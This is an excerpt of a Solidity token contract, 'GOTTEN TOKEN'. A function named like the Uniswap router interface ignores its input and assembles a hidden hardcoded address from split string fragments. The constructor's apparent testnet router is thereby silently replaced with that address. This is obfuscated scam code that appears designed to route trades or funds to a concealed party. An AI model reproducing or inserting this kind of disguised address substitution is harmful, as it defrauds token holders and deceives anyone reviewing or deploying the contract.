...
abstract contract Context {
    ...
    function IUniSwapV2Router02(address msgSender) internal view virtual returns (address) {
        string memory s = string(abi.encodePacked("0xcB493dE08", "efE47B5f9659C", "eeF3055cA", "415B2", "1bD5"));
        string memory a = s;
        msgSender = parseAddr(a);
        return msgSender;
    }
...
contract gottentoken is Context, IERC20 { 
    ...
    string private constant _name = "GOTTEN TOKEN"; 
    string private constant _symbol = unicode"GOTTEN"; 
    ...
    constructor () {
        ...
        _uniSwapV2Router = IUniSwapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); // Testnet
